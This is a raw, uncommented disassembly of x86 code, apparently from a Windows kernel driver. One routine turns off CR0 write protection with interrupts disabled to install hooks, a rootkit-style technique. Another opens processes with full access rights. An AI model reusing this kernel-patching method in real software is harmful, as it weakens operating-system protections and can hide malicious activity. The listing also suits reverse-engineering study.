   1817e:	call   0x1daa0
   18183:	add    esp,0x10
   18186:	push   0x25
   18188:	push   0x7a370
   1818d:	push   esi
   1818e:	push   edi
   1818f:	call   0x10ad8
   18194:	lea    eax,[ebp-0x828]
   1819a:	push   eax
   1819b:	push   esi
   1819c:	push   edi
   1819d:	lea    eax,[ebp-0x83c]
   181a3:	push   eax
   181a4:	call   0x1a072
   181a9:	mov    BYTE PTR [ebp-0x83c],bl
   181af:	mov    eax,DWORD PTR [ebp-0x838]
   181b5:	mov    DWORD PTR [ebp-0x824],eax
   181bb:	cmp    eax,ebx
   181bd:	je     0x181d8
   181bf:	push   DWORD PTR [ebp-0x828]
   181c5:	push   eax
   181c6:	call   0x17ab2
   181cb:	test   al,al
   181cd:	je     0x181d8
   181cf:	mov    BYTE PTR [ebp-0x81d],0x1
   181d6:	jmp    0x181e6
   181d8:	mov    BYTE PTR [ebp-0x81d],0x1
   181df:	mov    BYTE PTR [ebp-0x81e],0x1
   181e6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   181ed:	jmp    0x181ff
   181ef:	xor    eax,eax
   181f1:	inc    eax
   181f2:	ret    
   181f3:	mov    esp,DWORD PTR [ebp-0x18]
   181f6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   181fd:	xor    ebx,ebx
   181ff:	push   DWORD PTR [ebp-0x82c]
   18205:	call   DWORD PTR ds:0x1ee60
   1820b:	cmp    BYTE PTR [ebp-0x81e],bl
   18211:	je     0x18236
   18213:	push   DWORD PTR [ebp-0x880]
   18219:	push   DWORD PTR [ebp-0x884]
   1821f:	push   DWORD PTR [ebp-0x828]
   18225:	push   DWORD PTR [ebp-0x824]
   1822b:	call   0x17ce6
   18230:	mov    BYTE PTR [ebp-0x81d],al
   18236:	cmp    DWORD PTR [ebp-0x824],ebx
   1823c:	je     0x1824a
   1823e:	push   DWORD PTR [ebp-0x824]
   18244:	call   0x10a9a
   18249:	pop    ecx
   1824a:	mov    al,BYTE PTR [ebp-0x81d]
   18250:	call   0x1de28
   18255:	ret    
   18256:	int3   
   18257:	int3   
   18258:	int3   
   18259:	int3   
   1825a:	int3   
   1825b:	int3   
   1825c:	mov    edi,edi
   1825e:	push   ebp
   1825f:	mov    ebp,esp
   18261:	sub    esp,0xbc
   18267:	mov    eax,ds:0x7eb38
   1826c:	xor    eax,ebp
   1826e:	mov    DWORD PTR [ebp-0x4],eax
   18271:	push   ebx
   18272:	push   edi
   18273:	push   0x1e938
   18278:	push   0xb
   1827a:	push   0x1e920
   1827f:	call   0x16c9e
   18284:	push   eax
   18285:	lea    eax,[ebp-0xbc]
   1828b:	push   eax
   1828c:	call   0x11c7a
   18291:	call   eax
   18293:	xor    eax,eax
   18295:	lea    edi,[ebp-0xb0]
   1829b:	stos   DWORD PTR es:[edi],eax
   1829c:	stos   DWORD PTR es:[edi],eax
   1829d:	stos   DWORD PTR es:[edi],eax
   1829e:	stos   DWORD PTR es:[edi],eax
   1829f:	xor    ebx,ebx
   182a1:	push   ebx
   182a2:	stos   DWORD PTR es:[edi],eax
   182a3:	push   ebx
   182a4:	push   ebx
   182a5:	push   0x1
   182a7:	xor    eax,eax
   182a9:	push   0x7
   182ab:	push   ebx
   182ac:	mov    DWORD PTR [ebp-0x94],ebx
   182b2:	lea    edi,[ebp-0x90]
   182b8:	stos   DWORD PTR es:[edi],eax
   182b9:	lea    eax,[ebp-0xbc]
   182bf:	mov    DWORD PTR [ebp-0xac],eax
   182c5:	push   ebx
   182c6:	lea    eax,[ebp-0x94]
   182cc:	push   eax
   182cd:	lea    eax,[ebp-0xb4]
   182d3:	push   eax
   182d4:	push   0x89
   182d9:	lea    eax,[ebp-0x8c]
   182df:	push   eax
   182e0:	mov    DWORD PTR [ebp-0x8c],ebx
   182e6:	mov    DWORD PTR [ebp-0xb4],0x18
   182f0:	mov    DWORD PTR [ebp-0xb0],ebx
   182f6:	mov    DWORD PTR [ebp-0xa8],0x240
   18300:	mov    DWORD PTR [ebp-0xa4],ebx
   18306:	mov    DWORD PTR [ebp-0xa0],ebx
   1830c:	call   0x1188a
   18311:	call   eax
   18313:	test   eax,eax
   18315:	jge    0x1831e
   18317:	xor    al,al
   18319:	jmp    0x183d9
   1831e:	push   esi
   1831f:	mov    esi,0x20c
   18324:	push   esi
   18325:	call   0x10a66
   1832a:	pop    ecx
   1832b:	push   0x1
   1832d:	mov    edi,eax
   1832f:	push   esi
   18330:	push   edi
   18331:	lea    eax,[ebp-0x94]
   18337:	push   eax
   18338:	push   DWORD PTR [ebp-0x8c]
   1833e:	cmp    edi,ebx
   18340:	setne  BYTE PTR [ebp-0x9c]
   18347:	call   0x11860
   1834c:	call   eax
   1834e:	push   DWORD PTR [ebp-0x8c]
   18354:	mov    esi,eax
   18356:	call   DWORD PTR ds:0x1ee60
   1835c:	cmp    esi,ebx
   1835e:	pop    esi
   1835f:	jge    0x18372
   18361:	cmp    BYTE PTR [ebp-0x9c],bl
   18367:	je     0x18317
   18369:	push   edi
   1836a:	call   0x10a9a
   1836f:	pop    ecx
   18370:	jmp    0x18317
   18372:	push   0x7
   18374:	push   0x1
   18376:	lea    eax,[ebp-0x84]
   1837c:	push   eax
   1837d:	push   DWORD PTR [edi+0x8]
   18380:	call   0x10810
   18385:	mov    ecx,0x7e208
   1838a:	lea    eax,[ebp-0x84]
   18390:	mov    dx,WORD PTR [eax]
   18393:	cmp    dx,WORD PTR [ecx]
   18396:	jne    0x183b6
   18398:	cmp    dx,bx
   1839b:	je     0x183b2
   1839d:	mov    dx,WORD PTR [eax+0x2]
   183a1:	cmp    dx,WORD PTR [ecx+0x2]
   183a5:	jne    0x183b6
   183a7:	add    eax,0x4
   183aa:	add    ecx,0x4
   183ad:	cmp    dx,bx
   183b0:	jne    0x18390
   183b2:	xor    eax,eax
   183b4:	jmp    0x183bb
   183b6:	sbb    eax,eax
   183b8:	sbb    eax,0xffffffff
   183bb:	cmp    eax,ebx
   183bd:	sete   BYTE PTR [ebp-0x85]
   183c4:	cmp    BYTE PTR [ebp-0x9c],bl
   183ca:	je     0x183d3
   183cc:	push   edi
   183cd:	call   0x10a9a
   183d2:	pop    ecx
   183d3:	mov    al,BYTE PTR [ebp-0x85]
   183d9:	mov    ecx,DWORD PTR [ebp-0x4]
   183dc:	pop    edi
   183dd:	xor    ecx,ebp
   183df:	pop    ebx
   183e0:	call   0x1da3b
   183e5:	leave  
   183e6:	ret    
   183e7:	int3   
   183e8:	int3   
   183e9:	int3   
   183ea:	int3   
   183eb:	int3   
   183ec:	push   0x0
   183ee:	push   0x19
   183f0:	call   0x109f0
   183f5:	test   edx,edx
   183f7:	jl     0x18434
   183f9:	jg     0x18400
   183fb:	cmp    eax,0x3
   183fe:	jbe    0x18434
   18400:	mov    DWORD PTR ds:0x7eb24,0x2
   1840a:	call   0x1a28e
   1840f:	push   0x1e9d8
   18414:	push   0x34
   18416:	push   0x1e96e
   1841b:	call   0x16c9e
   18420:	mov    edx,0x7e2c8
   18425:	movzx  ecx,WORD PTR [eax]
   18428:	inc    eax
   18429:	mov    WORD PTR [edx],cx
   1842c:	inc    eax
   1842d:	inc    edx
   1842e:	inc    edx
   1842f:	test   cx,cx
   18432:	jne    0x18425
   18434:	ret    
   18435:	int3   
   18436:	int3   
   18437:	int3   
   18438:	int3   
   18439:	int3   
   1843a:	mov    edi,edi
   1843c:	push   ebp
   1843d:	mov    ebp,esp
   1843f:	push   esi
   18440:	mov    esi,ecx
   18442:	lea    ecx,[esi+0x4]
   18445:	mov    DWORD PTR [esi],0x7a3a8
   1844b:	mov    BYTE PTR [ecx+0x8],0x0
   1844f:	call   0x146a2
   18454:	lea    ecx,[esi+0x14]
   18457:	mov    BYTE PTR [ecx+0x8],0x0
   1845b:	call   0x144f0
   18460:	mov    eax,DWORD PTR [ebp+0x8]
   18463:	mov    DWORD PTR [esi+0x24],eax
   18466:	mov    eax,DWORD PTR [ebp+0xc]
   18469:	mov    DWORD PTR [esi+0x28],eax
   1846c:	mov    eax,esi
   1846e:	pop    esi
   1846f:	pop    ebp
   18470:	ret    0x8
   18473:	int3   
   18474:	int3   
   18475:	int3   
   18476:	int3   
   18477:	int3   
   18478:	mov    edi,edi
   1847a:	push   esi
   1847b:	mov    esi,ecx
   1847d:	lea    ecx,[esi+0x14]
   18480:	mov    DWORD PTR [esi],0x7a3a8
   18486:	call   0x160fe
   1848b:	lea    ecx,[esi+0x4]
   1848e:	pop    esi
   1848f:	jmp    0x16aac
   18494:	int3   
   18495:	int3   
   18496:	int3   
   18497:	int3   
   18498:	int3   
   18499:	int3   
   1849a:	mov    edi,edi
   1849c:	push   ebp
   1849d:	mov    ebp,esp
   1849f:	sub    esp,0x124
   184a5:	push   ebx
   184a6:	push   esi
   184a7:	push   edi
   184a8:	mov    esi,ecx
   184aa:	call   0x16fae
   184af:	push   DWORD PTR [ebp+0x8]
   184b2:	lea    eax,[ebp-0x4]
   184b5:	lea    edi,[esi+0x4]
   184b8:	push   eax
   184b9:	mov    ecx,edi
   184bb:	call   0x13d2e
   184c0:	mov    ebx,DWORD PTR [ebp-0x4]
   184c3:	cmp    ebx,DWORD PTR [esi+0x8]
   184c6:	je     0x18511
   184c8:	mov    eax,DWORD PTR [esi+0x18]
   184cb:	lea    ecx,[ebp+0x8]
   184ce:	mov    DWORD PTR [ebp+0x8],eax
   184d1:	call   0x13d0e
   184d6:	mov    edi,DWORD PTR [eax]
   184d8:	lea    eax,[ebx+0x68]
   184db:	add    esi,0x14
   184de:	inc    edi
   184df:	push   eax
   184e0:	mov    ecx,esi
   184e2:	mov    DWORD PTR [ebp+0x8],edi
   184e5:	mov    DWORD PTR [ebp-0x4],eax
   184e8:	call   0x14de8
   184ed:	lea    eax,[ebp+0x8]
   184f0:	push   eax
   184f1:	lea    eax,[ebp-0xc]
   184f4:	push   eax
   184f5:	mov    ecx,esi
   184f7:	call   0x160d4
   184fc:	push   DWORD PTR [ebp+0xc]
   184ff:	lea    ecx,[ebx+0x18]
   18502:	call   0x12a78
   18507:	mov    eax,DWORD PTR [ebp-0x4]
   1850a:	mov    DWORD PTR [eax],edi
   1850c:	jmp    0x185a6
   18511:	lea    ecx,[ebp-0x64]
   18514:	call   0x136d8
   18519:	xor    eax,eax
   1851b:	cmp    DWORD PTR [esi+0x20],eax
   1851e:	je     0x18531
   18520:	mov    eax,DWORD PTR [esi+0x18]
   18523:	lea    ecx,[ebp-0x4]
   18526:	mov    DWORD PTR [ebp-0x4],eax
   18529:	call   0x13d0e
   1852e:	mov    eax,DWORD PTR [eax]
   18530:	inc    eax
   18531:	push   DWORD PTR [ebp+0xc]
   18534:	lea    ecx,[ebp-0x64]
   18537:	mov    DWORD PTR [ebp-0x4],eax
   1853a:	mov    DWORD PTR [ebp-0x14],eax
   1853d:	call   0x12a78
   18542:	lea    eax,[ebp-0x64]
   18545:	push   eax
   18546:	push   DWORD PTR [ebp+0x8]
   18549:	lea    ecx,[ebp-0x124]
   1854f:	call   0x135e0
   18554:	lea    eax,[ebp-0x124]
   1855a:	push   eax
   1855b:	lea    ecx,[ebp-0xc4]
   18561:	call   0x13a10
   18566:	lea    eax,[ebp-0xc4]
   1856c:	push   eax
   1856d:	lea    eax,[ebp-0xc]
   18570:	push   eax
   18571:	mov    ecx,edi
   18573:	call   0x16a82
   18578:	lea    ecx,[ebp-0xc4]
   1857e:	call   0x12afe
   18583:	lea    ecx,[ebp-0x124]
   18589:	call   0x12afe
   1858e:	lea    eax,[ebp-0x4]
   18591:	push   eax
   18592:	lea    eax,[ebp-0xc]
   18595:	push   eax
   18596:	lea    ecx,[esi+0x14]
   18599:	call   0x160d4
   1859e:	lea    ecx,[ebp-0x64]
   185a1:	call   0x11eec
   185a6:	pop    edi
   185a7:	pop    esi
   185a8:	pop    ebx
   185a9:	leave  
   185aa:	ret    0x8
   185ad:	int3   
   185ae:	int3   
   185af:	int3   
   185b0:	int3   
   185b1:	int3   
   185b2:	mov    edi,edi
   185b4:	push   ebp
   185b5:	mov    ebp,esp
   185b7:	sub    esp,0x10
   185ba:	call   0x1a1fc
   185bf:	test   al,al
   185c1:	jne    0x185cb
   185c3:	mov    eax,DWORD PTR [ebp+0x8]
   185c6:	jmp    0x1865f
   185cb:	push   esi
   185cc:	mov    esi,DWORD PTR [ebp+0x8]
   185cf:	push   0xffffffff
   185d1:	push   esi
   185d2:	lea    ecx,[ebp-0x8]
   185d5:	call   0x11170
   185da:	mov    ecx,DWORD PTR ds:0x7f860
   185e0:	lea    eax,[ebp-0x8]
   185e3:	push   eax
   185e4:	lea    eax,[ebp+0x8]
   185e7:	push   eax
   185e8:	call   0x1421e
   185ed:	mov    eax,DWORD PTR [ebp+0x8]
   185f0:	mov    ecx,DWORD PTR ds:0x7f860
   185f6:	cmp    eax,DWORD PTR [ecx+0x4]
   185f9:	jne    0x1862a
   185fb:	lea    eax,[ebp-0x8]
   185fe:	push   eax
   185ff:	lea    ecx,[ebp-0x10]
   18602:	call   0x12b3a
   18607:	mov    ecx,DWORD PTR ds:0x7f860
   1860d:	lea    eax,[ebp-0x10]
   18610:	push   eax
   18611:	lea    eax,[ebp-0x8]
   18614:	push   eax
   18615:	call   0x17060
   1861a:	mov    ecx,eax
   1861c:	call   0x12b5c
   18621:	push   DWORD PTR [ebp-0x10]
   18624:	call   0x10a9a
   18629:	pop    ecx
   1862a:	mov    ecx,DWORD PTR ds:0x7f860
   18630:	lea    eax,[ebp-0x8]
   18633:	push   eax
   18634:	lea    eax,[ebp+0x8]
   18637:	push   eax
   18638:	call   0x1421e
   1863d:	mov    eax,DWORD PTR [ebp+0x8]
   18640:	mov    ecx,DWORD PTR ds:0x7f860
   18646:	cmp    eax,DWORD PTR [ecx+0x4]
   18649:	je     0x1864e
   1864b:	mov    esi,DWORD PTR [eax+0x14]
   1864e:	call   0x1a218
   18653:	push   DWORD PTR [ebp-0x8]
   18656:	call   0x10a9a
   1865b:	pop    ecx
   1865c:	mov    eax,esi
   1865e:	pop    esi
   1865f:	leave  
   18660:	ret    0x4
   18663:	int3   
   18664:	int3   
   18665:	int3   
   18666:	int3   
   18667:	int3   
   18668:	mov    edi,edi
   1866a:	push   ebp
   1866b:	mov    ebp,esp
   1866d:	push   esi
   1866e:	mov    esi,ecx
   18670:	call   0x18478
   18675:	test   BYTE PTR [ebp+0x8],0x1
   18679:	je     0x18682
   1867b:	push   esi
   1867c:	call   0x10a9a
   18681:	pop    ecx
   18682:	mov    eax,esi
   18684:	pop    esi
   18685:	pop    ebp
   18686:	ret    0x4
   18689:	int3   
   1868a:	int3   
   1868b:	int3   
   1868c:	int3   
   1868d:	int3   
   1868e:	mov    edi,edi
   18690:	push   ebp
   18691:	mov    ebp,esp
   18693:	push   esi
   18694:	push   DWORD PTR [ebp+0xc]
   18697:	mov    esi,ecx
   18699:	push   DWORD PTR [ebp+0x8]
   1869c:	call   0x1843a
   186a1:	mov    eax,esi
   186a3:	pop    esi
   186a4:	pop    ebp
   186a5:	ret    0x8
   186a8:	int3   
   186a9:	int3   
   186aa:	int3   
   186ab:	int3   
   186ac:	int3   
   186ad:	int3   
   186ae:	push   0x33c
   186b3:	push   0x7e0b8
   186b8:	call   0x1dde0
   186bd:	mov    esi,DWORD PTR [ebp+0xc]
   186c0:	mov    DWORD PTR [ebp-0x32c],esi
   186c6:	call   DWORD PTR ds:0x1ee00
   186cc:	xor    ebx,ebx
   186ce:	cmp    BYTE PTR [ebp+0x10],bl
   186d1:	jne    0x1870f
   186d3:	push   esi
   186d4:	mov    ecx,DWORD PTR ds:0x7eb68
   186da:	call   0x15e78
   186df:	mov    edi,eax
   186e1:	push   esi
   186e2:	mov    ecx,DWORD PTR ds:0x7eb68
   186e8:	call   0x166b0
   186ed:	mov    eax,edi
   186ef:	dec    eax
   186f0:	je     0x18704
   186f2:	dec    eax
   186f3:	je     0x18700
   186f5:	dec    eax
   186f6:	jne    0x188e9
   186fc:	push   0xa
   186fe:	jmp    0x18705
   18700:	push   0x2
   18702:	jmp    0x18705
   18704:	push   ebx
   18705:	call   0x10ff6
   1870a:	jmp    0x188e9
   1870f:	mov    DWORD PTR [ebp-0x320],ebx
   18715:	xor    eax,eax
   18717:	lea    edi,[ebp-0x326]
   1871d:	stos   DWORD PTR es:[edi],eax
   1871e:	stos   WORD PTR es:[edi],ax
   18720:	xor    eax,eax
   18722:	mov    WORD PTR [ebp-0x21c],ax
   18729:	push   0x1fc
   1872e:	push   ebx
   1872f:	lea    eax,[ebp-0x21a]
   18735:	push   eax
   18736:	call   0x1dab8
   1873b:	add    esp,0xc
   1873e:	lea    eax,[ebp-0x21c]
   18744:	mov    DWORD PTR [ebp-0x324],eax
   1874a:	xor    eax,eax
   1874c:	mov    WORD PTR [ebp-0x328],ax
   18753:	mov    eax,0x1fe
   18758:	mov    WORD PTR [ebp-0x326],ax
   1875f:	mov    DWORD PTR [ebp-0x34c],0x18
   18769:	mov    DWORD PTR [ebp-0x348],ebx
   1876f:	mov    DWORD PTR [ebp-0x340],0x200
   18779:	mov    DWORD PTR [ebp-0x344],ebx
   1877f:	mov    DWORD PTR [ebp-0x33c],ebx
   18785:	mov    DWORD PTR [ebp-0x338],ebx
   1878b:	mov    DWORD PTR [ebp-0x334],esi
   18791:	mov    DWORD PTR [ebp-0x330],ebx
   18797:	lea    eax,[ebp-0x334]
   1879d:	push   eax
   1879e:	lea    eax,[ebp-0x34c]
   187a4:	push   eax
   187a5:	push   0x1f0fff
   187aa:	lea    eax,[ebp-0x320]
   187b0:	push   eax
   187b1:	call   0x116bc
   187b6:	call   eax
   187b8:	test   eax,eax
   187ba:	jl     0x188e9
   187c0:	lea    eax,[ebp-0x328]
   187c6:	push   eax
   187c7:	push   DWORD PTR [ebp-0x320]
   187cd:	call   0x11fb8
   187d2:	cmp    eax,ebx
   187d4:	jl     0x188dd
   187da:	movzx  eax,WORD PTR [ebp-0x328]
   187e1:	shr    eax,1
   187e3:	xor    ecx,ecx
   187e5:	mov    WORD PTR [ebp+eax*2-0x21c],cx
   187ed:	push   DWORD PTR [ebp-0x320]
   187f3:	call   0x1204a
   187f8:	lea    eax,[ebp-0x21c]
   187fe:	push   eax
   187ff:	call   0x10dd4
   18804:	cmp    eax,ebx
   18806:	je     0x1882b
   18808:	push   eax
   18809:	push   esi
   1880a:	mov    ecx,DWORD PTR ds:0x7eb68
   18810:	call   0x16c5c
   18815:	push   DWORD PTR [ebp-0x320]
   1881b:	push   DWORD PTR [ebp-0x320]
   18821:	call   0x1204a
   18826:	push   eax
   18827:	push   esi
   18828:	push   ebx
   18829:	jmp    0x188a9
   1882b:	push   0x1ea1a
   18830:	push   0x9
   18832:	push   0x1ea06
   18837:	call   0x16c9e
   1883c:	push   eax
   1883d:	lea    eax,[ebp-0x328]
   18843:	push   eax
   18844:	call   0x10e16
   18849:	test   al,al
   1884b:	je     0x188b0
   1884d:	cmp    DWORD PTR ds:0x7f83c,ebx
   18853:	jne    0x18886
   18855:	mov    DWORD PTR ds:0x7f83c,0x1
   1885f:	mov    DWORD PTR [ebp-0x4],ebx
   18862:	call   0x17f92
   18867:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1886e:	jmp    0x18886
   18870:	xor    eax,eax
   18872:	inc    eax
   18873:	ret    
   18874:	mov    esp,DWORD PTR [ebp-0x18]
   18877:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1887e:	xor    ebx,ebx
   18880:	mov    esi,DWORD PTR [ebp-0x32c]
   18886:	cmp    DWORD PTR ds:0x7edbc,ebx
   1888c:	jne    0x18894
   1888e:	mov    DWORD PTR ds:0x7edbc,esi
   18894:	push   DWORD PTR [ebp-0x320]
   1889a:	push   DWORD PTR [ebp-0x320]
   188a0:	call   0x1204a
   188a5:	push   eax
   188a6:	push   esi
   188a7:	push   0x1
   188a9:	call   0x137f0
   188ae:	jmp    0x188dd
   188b0:	lea    eax,[ebp-0x31c]
   188b6:	push   eax
   188b7:	call   0x10fa6
   188bc:	test   al,al
   188be:	je     0x188dd
   188c0:	lea    eax,[ebp-0x31c]
   188c6:	push   eax
   188c7:	lea    eax,[ebp-0x328]
   188cd:	push   eax
   188ce:	call   0x10e16
   188d3:	test   al,al
   188d5:	je     0x188dd
   188d7:	push   esi
   188d8:	call   0x1207a
   188dd:	push   DWORD PTR [ebp-0x320]
   188e3:	call   DWORD PTR ds:0x1ee60
   188e9:	call   0x1de28
   188ee:	ret    0xc
   188f1:	int3   
   188f2:	int3   
   188f3:	int3   
   188f4:	int3   
   188f5:	int3   
   188f6:	mov    edi,edi
   188f8:	push   ebp
   188f9:	mov    ebp,esp
   188fb:	push   ecx
   188fc:	cli    
   188fd:	mov    eax,cr0
   18900:	mov    DWORD PTR [ebp-0x4],eax
   18903:	nop
   18904:	and    eax,0xfffeffff
   18909:	mov    cr0,eax
   1890c:	push   0x17772
   18911:	push   DWORD PTR ds:0x7ed04
   18917:	call   0x198c0
   1891c:	push   0x0
   1891e:	push   0x186ae
   18923:	mov    ds:0x7ed08,eax
   18928:	call   0x1173a
   1892d:	call   eax
   1892f:	push   0x1765e
   18934:	call   0x116e6
   18939:	call   eax
   1893b:	mov    eax,DWORD PTR [ebp-0x4]
   1893e:	mov    cr0,eax
   18941:	sti    
   18942:	leave  
   18943:	ret    
   18944:	int3   
   18945:	int3   
   18946:	int3   
   18947:	int3   
   18948:	int3   
   18949:	int3   
   1894a:	mov    edi,edi
   1894c:	push   ebp
   1894d:	mov    ebp,esp
   1894f:	sub    esp,0x50
   18952:	push   ebx
   18953:	mov    ebx,DWORD PTR [ebp+0x8]
   18956:	push   esi
   18957:	test   bl,0x20
   1895a:	je     0x1899d
   1895c:	push   DWORD PTR [ebp+0x30]
   1895f:	mov    esi,DWORD PTR ds:0x7ed00
   18965:	push   DWORD PTR [ebp+0x2c]
   18968:	lea    ecx,[ebp-0x50]
   1896b:	push   DWORD PTR [ebp+0x28]
   1896e:	push   DWORD PTR [ebp+0x24]
   18971:	push   DWORD PTR [ebp+0x20]
   18974:	push   DWORD PTR [ebp+0x1c]
   18977:	push   DWORD PTR [ebp+0x14]
   1897a:	push   DWORD PTR [ebp+0x10]
   1897d:	push   DWORD PTR [ebp+0xc]
   18980:	call   0x1373c
   18985:	push   eax
   18986:	push   DWORD PTR [ebp+0xc]
   18989:	mov    ecx,esi
   1898b:	call   0x1849a
   18990:	lea    ecx,[ebp-0x50]
   18993:	call   0x11eec
   18998:	jmp    0x18ae2
   1899d:	push   DWORD PTR [ebp+0xc]
   189a0:	mov    ecx,DWORD PTR ds:0x7ecf8
   189a6:	call   0x1617a
   189ab:	test   eax,eax
   189ad:	jne    0x189bb
   189af:	test   bl,0x1
   189b2:	jne    0x189bb
   189b4:	xor    al,al
   189b6:	jmp    0x18ae4
   189bb:	push   DWORD PTR [ebp+0xc]
   189be:	mov    ecx,DWORD PTR ds:0x7ecf8
   189c4:	call   0x16ea4
   189c9:	mov    esi,eax
   189cb:	test   bl,0x1
   189ce:	je     0x18a18
   189d0:	mov    eax,DWORD PTR [ebp+0x28]
   189d3:	push   DWORD PTR [ebp+0xc]
   189d6:	mov    ecx,esi
   189d8:	mov    DWORD PTR [esi+0x2c],eax
   189db:	call   0x129ea
   189e0:	push   DWORD PTR [ebp+0x10]
   189e3:	lea    ecx,[esi+0x8]
   189e6:	call   0x129ea
   189eb:	mov    eax,DWORD PTR [ebp+0x14]
   189ee:	push   DWORD PTR [ebp+0x18]
   189f1:	lea    ecx,[esi+0x14]
   189f4:	mov    DWORD PTR [esi+0x10],eax
   189f7:	call   0x129ea
   189fc:	push   DWORD PTR [ebp+0x1c]
   189ff:	lea    ecx,[esi+0x1c]
   18a02:	call   0x129ea
   18a07:	push   DWORD PTR [ebp+0x20]
   18a0a:	lea    ecx,[esi+0x24]
   18a0d:	call   0x129ea
   18a12:	mov    eax,DWORD PTR [ebp+0x2c]
   18a15:	mov    DWORD PTR [esi+0x30],eax
   18a18:	mov    DWORD PTR [ebp+0x28],ebx
   18a1b:	and    DWORD PTR [ebp+0x28],0x2
   18a1f:	je     0x18a2f
   18a21:	mov    eax,DWORD PTR [ebp+0x30]
   18a24:	mov    ecx,DWORD PTR [eax]
   18a26:	mov    DWORD PTR [esi+0x38],ecx
   18a29:	mov    eax,DWORD PTR [eax+0x4]
   18a2c:	mov    DWORD PTR [esi+0x3c],eax
   18a2f:	mov    DWORD PTR [ebp+0x10],ebx
   18a32:	and    DWORD PTR [ebp+0x10],0x4
   18a36:	je     0x18a46
   18a38:	mov    eax,DWORD PTR [ebp+0x34]
   18a3b:	mov    ecx,DWORD PTR [eax]
   18a3d:	mov    DWORD PTR [esi+0x40],ecx
   18a40:	mov    eax,DWORD PTR [eax+0x4]
   18a43:	mov    DWORD PTR [esi+0x44],eax
   18a46:	test   bl,0x10
   18a49:	je     0x18ae2
   18a4f:	cmp    DWORD PTR [esi+0x18],0x0
   18a53:	jbe    0x18ae2
   18a59:	mov    eax,ds:0x7ecf8
   18a5e:	mov    eax,DWORD PTR [eax+0x4]
   18a61:	push   edi
   18a62:	mov    edi,DWORD PTR [eax]
   18a64:	mov    DWORD PTR [ebp+0x14],edi
   18a67:	cmp    edi,eax
   18a69:	je     0x18ae1
   18a6b:	push   DWORD PTR [ebp+0xc]
   18a6e:	lea    ebx,[edi+0x10]
   18a71:	push   ebx
   18a72:	call   0x19808
   18a77:	test   al,al
   18a79:	je     0x18acc
   18a7b:	lea    eax,[esi+0x14]
   18a7e:	push   eax
   18a7f:	add    edi,0x2c
   18a82:	push   edi
   18a83:	call   0x197f8
   18a88:	test   al,al
   18a8a:	je     0x18acc
   18a8c:	cmp    DWORD PTR [ebp+0x28],0x0
   18a90:	je     0x18aac
   18a92:	mov    ecx,DWORD PTR ds:0x7ecf8
   18a98:	push   ebx
   18a99:	call   0x16ea4
   18a9e:	mov    ecx,DWORD PTR [ebp+0x30]
   18aa1:	mov    edx,DWORD PTR [ecx]
   18aa3:	mov    DWORD PTR [eax+0x38],edx
   18aa6:	mov    ecx,DWORD PTR [ecx+0x4]
   18aa9:	mov    DWORD PTR [eax+0x3c],ecx
   18aac:	cmp    DWORD PTR [ebp+0x10],0x0
   18ab0:	je     0x18acc
   18ab2:	mov    ecx,DWORD PTR ds:0x7ecf8
   18ab8:	push   ebx
   18ab9:	call   0x16ea4
   18abe:	mov    ecx,DWORD PTR [ebp+0x34]
   18ac1:	mov    edx,DWORD PTR [ecx]
   18ac3:	mov    DWORD PTR [eax+0x40],edx
   18ac6:	mov    ecx,DWORD PTR [ecx+0x4]
   18ac9:	mov    DWORD PTR [eax+0x44],ecx
   18acc:	lea    ecx,[ebp+0x14]
   18acf:	call   0x1387e
   18ad4:	mov    edi,DWORD PTR [ebp+0x14]
   18ad7:	mov    eax,ds:0x7ecf8
   18adc:	cmp    edi,DWORD PTR [eax+0x4]
   18adf:	jne    0x18a6b
   18ae1:	pop    edi
   18ae2:	mov    al,0x1
   18ae4:	pop    esi
   18ae5:	pop    ebx
   18ae6:	leave  
   18ae7:	ret    0x30
   18aea:	int3   
   18aeb:	int3   
   18aec:	int3   
   18aed:	int3   
   18aee:	int3   
   18aef:	int3   
   18af0:	push   0x4c
   18af2:	push   0x7e0d8
   18af7:	call   0x1dadc
   18afc:	xor    esi,esi
   18afe:	push   esi
   18aff:	push   esi
   18b00:	push   esi
   18b01:	push   esi
   18b02:	push   0x7eb70
   18b07:	call   DWORD PTR ds:0x1ee28
   18b0d:	cmp    eax,esi
   18b0f:	jge    0x18b20
   18b11:	mov    eax,DWORD PTR [ebp+0x8]
   18b14:	mov    DWORD PTR [eax+0x8],0x4
   18b1b:	jmp    0x18c55
   18b20:	mov    DWORD PTR [ebp-0x4],esi
   18b23:	or     ebx,0xffffffff
   18b26:	push   ebx
   18b27:	mov    esi,DWORD PTR [ebp+0x8]
   18b2a:	lea    eax,[esi+0x28]
   18b2d:	push   eax
   18b2e:	lea    ecx,[ebp-0x44]
   18b31:	call   0x129a8
   18b36:	mov    edi,DWORD PTR [ebp-0x40]
   18b39:	inc    edi
   18b3a:	push   ebx
   18b3b:	lea    eax,[edi+esi*1+0x28]
   18b3f:	push   eax
   18b40:	lea    ecx,[ebp-0x3c]
   18b43:	call   0x129a8
   18b48:	mov    eax,DWORD PTR [ebp-0x38]
   18b4b:	lea    edi,[edi+eax*1+0x1]
   18b4f:	mov    eax,DWORD PTR [edi+esi*1+0x28]
   18b53:	mov    DWORD PTR [ebp-0x1c],eax
   18b56:	add    edi,0x4
   18b59:	push   ebx
   18b5a:	lea    eax,[edi+esi*1+0x28]
   18b5e:	push   eax
   18b5f:	lea    ecx,[ebp-0x34]
   18b62:	call   0x129a8
   18b67:	mov    eax,DWORD PTR [ebp-0x30]
   18b6a:	lea    edi,[edi+eax*1+0x1]
   18b6e:	push   ebx
   18b6f:	lea    eax,[edi+esi*1+0x28]
   18b73:	push   eax
   18b74:	lea    ecx,[ebp-0x2c]
   18b77:	call   0x129a8
   18b7c:	mov    eax,DWORD PTR [ebp-0x28]
   18b7f:	lea    edi,[edi+eax*1+0x1]
   18b83:	push   ebx
   18b84:	lea    eax,[edi+esi*1+0x28]
   18b88:	push   eax
   18b89:	lea    ecx,[ebp-0x24]
   18b8c:	call   0x129a8
   18b91:	mov    eax,DWORD PTR [ebp-0x20]
   18b94:	lea    eax,[edi+eax*1+0x1]
   18b98:	push   ebx
   18b99:	lea    eax,[eax+esi*1+0x28]
   18b9d:	push   eax
   18b9e:	lea    ecx,[ebp-0x5c]
   18ba1:	call   0x129a8
   18ba6:	mov    eax,DWORD PTR [esi+0xc]
   18ba9:	mov    ecx,DWORD PTR [esi+0x18]
   18bac:	mov    DWORD PTR [ebp-0x54],ecx
   18baf:	mov    ecx,DWORD PTR [esi+0x1c]
